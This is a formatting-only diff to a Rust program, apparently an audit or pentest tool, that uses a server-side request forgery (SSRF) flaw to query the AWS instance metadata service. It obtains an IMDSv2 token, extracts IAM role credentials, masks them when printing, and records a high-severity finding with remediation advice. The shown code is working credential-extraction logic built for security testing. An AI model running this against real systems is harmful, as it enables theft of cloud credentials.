@@ -199,10 +199,7 @@ async fn ssrf_get(
 
 // Attempt to obtain an IMDSv2 token via PUT through the SSRF
 // Returns the token string on success
-async fn try_imdsv2_token(
-    client: &reqwest::Client,
-    ssrf_base: &str,
-) -> Option<String> {
+async fn try_imdsv2_token(client: &reqwest::Client, ssrf_base: &str) -> Option<String> {
     let token_ssrf_url = build_ssrf_url(ssrf_base, IMDS_TOKEN_PATH);
     // PUT with the TTL header — if SSRF supports forwarding custom headers
     let resp = client
@@ -304,17 +301,18 @@ async fn main() -> Result<()> {
     let credentials = if let Some(role) = &role_name {
         let creds_path = format!("{IMDS_IAM_CREDS_PATH}{role}");
         eprintln!("  fetching credentials for role {role}...");
-        let (status3, body3, url3) =
-            ssrf_get(&client, &args.ssrf_url, &creds_path, tok_ref).await;
+        let (status3, body3, url3) = ssrf_get(&client, &args.ssrf_url, &creds_path, tok_ref).await;
         steps.push(make_step(&creds_path, &url3, status3, &body3));
         if status3 == 200 {
-            serde_json::from_str::<IamCredentials>(&body3).ok().map(|c| MaskedCredentials {
-                access_key_id: mask_sensitive(&c.access_key_id),
-                secret_access_key: mask_sensitive(&c.secret_access_key),
-                token: mask_sensitive(&c.token),
-                expiration: c.expiration,
-                credential_type: c.credential_type,
-            })
+            serde_json::from_str::<IamCredentials>(&body3)
+                .ok()
+                .map(|c| MaskedCredentials {
+                    access_key_id: mask_sensitive(&c.access_key_id),
+                    secret_access_key: mask_sensitive(&c.secret_access_key),
+                    token: mask_sensitive(&c.token),
+                    expiration: c.expiration,
+                    credential_type: c.credential_type,
+                })
         } else {
             None
         }
@@ -334,8 +332,7 @@ async fn main() -> Result<()> {
     };
 
     // Step 5: ami-id
-    let (status5, body5, url5) =
-        ssrf_get(&client, &args.ssrf_url, IMDS_AMI_ID_PATH, tok_ref).await;
+    let (status5, body5, url5) = ssrf_get(&client, &args.ssrf_url, IMDS_AMI_ID_PATH, tok_ref).await;
     steps.push(make_step(IMDS_AMI_ID_PATH, &url5, status5, &body5));
     let ami_id = if status5 == 200 {
         let v = body5.trim().to_string();
@@ -358,9 +355,7 @@ async fn main() -> Result<()> {
         println!("IAM Role:      {role}");
     }
     if let Some(creds) = &credentials {
-        println!(
-            "{ANSI_RED}[HIGH] IAM credentials extracted!{ANSI_RESET}"
-        );
+        println!("{ANSI_RED}[HIGH] IAM credentials extracted!{ANSI_RESET}");
         println!("  AccessKeyId:     {}", creds.access_key_id);
         println!("  SecretAccessKey: {}", creds.secret_access_key);
         println!("  Token:           {}", creds.token);
@@ -376,10 +371,18 @@ async fn main() -> Result<()> {
     // Write HIGH finding when IAM credentials are extracted
     if high_severity {
         let role = role_name.as_deref().unwrap_or("unknown");
-        let tf = ToolFinding::new(AUDIT_TOOL, "AWS IAM Credentials Extracted via SSRF", FindingSeverity::High)
-            .url(args.ssrf_url.clone())
-            .evidence(format!("IAM role={role} credentials obtained via IMDS {version_used}"))
-            .recommendation("Require IMDSv2 token-hop-limit=1; restrict outbound SSRF at the application layer");
+        let tf = ToolFinding::new(
+            AUDIT_TOOL,
+            "AWS IAM Credentials Extracted via SSRF",
+            FindingSeverity::High,
+        )
+        .url(args.ssrf_url.clone())
+        .evidence(format!(
+            "IAM role={role} credentials obtained via IMDS {version_used}"
+        ))
+        .recommendation(
+            "Require IMDSv2 token-hop-limit=1; restrict outbound SSRF at the application layer",
+        );
         let _ = write_finding(&eng, &tf);
     }
 
